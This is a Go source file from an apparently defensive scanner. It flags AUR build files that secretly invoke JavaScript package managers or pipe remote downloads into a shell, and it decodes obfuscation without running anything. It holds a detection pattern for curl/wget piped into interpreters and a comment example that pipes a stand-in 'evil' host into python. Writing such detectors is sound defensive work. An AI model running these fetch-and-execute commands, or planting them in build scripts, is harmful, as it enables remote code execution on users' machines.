// Package aur parses Arch User Repository build files — PKGBUILD, the .install
// scriptlet, and alpm .hook files — for the cross-registry hop the design warns
// about: an AUR package that quietly reaches into npm/bun/npx/pnpm (or curl-pipes
// a script) during build/install, pulling a JavaScript payload outside any
// lockfile. Obfuscation (hex escapes, `$'\x..'`, broken-up quoting) is decoded
// AS DATA so the scanner sees through it, and NOTHING is ever executed.
//
// Every function here is a pure string transform or matcher, exhaustively table
// tested. Decoding is bounded and side-effect-free: it expands escape sequences
// and strips quoting to reveal the literal command text, it does not run a shell.
package aur

import (
	"fmt"
	"regexp"
	"strconv"
	"strings"

	"github.com/mtclinton/defensive-suite/instguard/internal/report"
)

// jsToolWord matches an unexpected JavaScript package-manager invocation as a
// whole word. These have no legitimate place in a PKGBUILD that builds a native
// Arch package; their presence is the cross-registry hop.
var jsToolWord = regexp.MustCompile(`(?i)\b(npm|npx|pnpm|bun|bunx|yarn)\b`)

// fetchPipeShell matches a remote download piped into a shell/interpreter — the
// same install-time RCE pattern as the npm hook scanner, here inside a PKGBUILD.
// The fetcher and interpreter alternations are kept identical to the hooks.go
// curl-pipe-sh detector so a `curl https://evil | python -c …` in a PKGBUILD is
// not missed simply because the AUR side recognised fewer interpreters.
var fetchPipeShell = regexp.MustCompile(`(?i)\b(curl|wget|fetch)\b[^|;&\n]*\|[^|\n]*\b(sh|bash|zsh|node|python[0-9.]*|perl|ruby)\b`)

// Deobfuscate reveals the literal text an obfuscated build line would expand to,
// purely as data. It:
//   - expands `\xNN` and `$'\xNN'` hex escapes to their byte,
//   - expands `\NNN` octal escapes,
//   - removes single/double quotes and backslash-escapes used only to break up
//     a keyword (e.g. n"p"m, n\pm, 'npm') so the matcher can't be evaded.
//
// It never evaluates `$(...)`, backticks, or variables — those are left intact
// (and themselves flagged as opaque). The result is for matching/reporting only.
func Deobfuscate(s string) string {
	s = expandHexAndOctal(s)
	s = stripQuotingTricks(s)
	return s
}

// expandHexAndOctal replaces \xNN (hex) and \NNN (octal) escapes with the
// literal byte. Bounded by input length; only printable-ish bytes are inlined so
// a decoded NUL/control byte can't corrupt later matching — non-printables become
// a single space, preserving word boundaries.
func expandHexAndOctal(s string) string {
	var b strings.Builder
	for i := 0; i < len(s); {
		if s[i] == '\\' && i+1 < len(s) && (s[i+1] == 'x' || s[i+1] == 'X') {
			// \xNN — one or two hex digits.
			j := i + 2
			start := j
			for j < len(s) && j-start < 2 && isHex(s[j]) {
				j++
			}
			if j > start {
				if v, err := strconv.ParseUint(s[start:j], 16, 16); err == nil {
					b.WriteByte(printableOrSpace(byte(v)))
					i = j
					continue
				}
			}
		}
		if s[i] == '\\' && i+1 < len(s) && s[i+1] >= '0' && s[i+1] <= '7' {
			// \NNN — one to three octal digits.
			j := i + 1
			start := j
			for j < len(s) && j-start < 3 && s[j] >= '0' && s[j] <= '7' {
				j++
			}
			if v, err := strconv.ParseUint(s[start:j], 8, 16); err == nil {
				b.WriteByte(printableOrSpace(byte(v)))
				i = j
				continue
			}
		}
		b.WriteByte(s[i])
		i++
	}
	return b.String()
}

// stripQuotingTricks removes the quote/backslash characters an attacker inserts
// only to break a keyword across tokens, while keeping word boundaries. It drops
// the `$` of a `$'...'` ANSI-C quote, then removes ' " and lone \ that sit
// between word characters. Whitespace, pipes, and redirects are preserved so the
// command structure (and so the fetch-pipe-shell matcher) still works.
func stripQuotingTricks(s string) string {
	// Drop the ANSI-C quote sigil so $'npm' reads as 'npm' -> npm.
	s = strings.ReplaceAll(s, "$'", "'")
	var b strings.Builder
	for i := 0; i < len(s); i++ {
		c := s[i]
		switch c {
		case '\'', '"':
			// Removing the quote splices the surrounding characters together,
			// collapsing n"p"m -> npm so the keyword matcher sees it.
			continue
		case '\\':
			// A backslash before a word char is only there to split a keyword;
			// drop it. Before whitespace/structure, keep the next char literally.
			if i+1 < len(s) {
				next := s[i+1]
				if isWord(next) {
					continue // splice: n\pm -> npm
				}
			}
			continue
		default:
			b.WriteByte(c)
		}
	}
	return b.String()
}

// ScanFile scans one AUR build file's content. path is recorded on findings.
// kind is informational ("PKGBUILD", "install", "hook"). It scans both the raw
// text and its de-obfuscated form so an obfuscated invocation is caught even
// though only the decoded copy matches.
func ScanFile(path, content string) []report.Finding {
	var findings []report.Finding
	decoded := Deobfuscate(content)

	for i, raw := range strings.Split(content, "\n") {
		line := strings.TrimSpace(raw)
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		dec := Deobfuscate(line)
		obfuscated := dec != line

		if m := jsToolWord.FindString(dec); m != "" {
			sev := report.SeverityHigh
			title := "unexpected JavaScript package-manager invocation in AUR build file"
			if obfuscated {
				sev = report.SeverityCritical
				title = "obfuscated JavaScript package-manager invocation in AUR build file"
			}
			findings = append(findings, report.Finding{
				Check: "aur", Severity: sev, Path: path,
				Title:     title,
				Detail:    fmt.Sprintf("%s line %d: tool=%s decoded=%q", kindLabel(path), i+1, strings.ToLower(m), oneLine(dec)),
				Technique: "T1195.001",
			})
		}
		if fetchPipeShell.MatchString(dec) {
			sev := report.SeverityCritical
			findings = append(findings, report.Finding{
				Check: "aur", Severity: sev, Path: path,
				Title:     "remote download piped into a shell in AUR build file",
				Detail:    fmt.Sprintf("%s line %d: decoded=%q", kindLabel(path), i+1, oneLine(dec)),
				Technique: "T1059",
			})
		}
	}

	// A whole-file decode that newly reveals a JS tool (e.g. a payload assembled
	// across concatenated variables on one logical line that our per-line pass
	// split) is reported once at Low so it is not silently missed.
	if decoded != content && jsToolWord.MatchString(decoded) && !jsToolWord.MatchString(content) {
		hitPerLine := false
		for _, f := range findings {
			if strings.Contains(f.Title, "package-manager") {
				hitPerLine = true
			}
		}
		if !hitPerLine {
			findings = append(findings, report.Finding{
				Check: "aur", Severity: report.SeverityMedium, Path: path,
				Title:  "JavaScript package-manager invocation revealed only after de-obfuscation",
				Detail: "the literal file text hides a npm/bun/pnpm call behind escape/quoting tricks",
			})
		}
	}
	return findings
}

func kindLabel(path string) string {
	switch {
	case strings.HasSuffix(path, ".install"):
		return "install"
	case strings.HasSuffix(path, ".hook"):
		return "hook"
	case strings.Contains(path, "PKGBUILD"):
		return "PKGBUILD"
	default:
		return "aur"
	}
}

func isHex(c byte) bool {
	return (c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F')
}

func isWord(c byte) bool {
	return c == '_' || c == '-' ||
		(c >= '0' && c <= '9') || (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z')
}

func printableOrSpace(b byte) byte {
	if b >= 0x20 && b < 0x7f {
		return b
	}
	return ' '
}

func oneLine(s string) string {
	s = strings.ReplaceAll(s, "\n", " ")
	s = strings.ReplaceAll(s, "\t", " ")
	if len(s) > 240 {
		s = s[:240] + "…"
	}
	return s
}
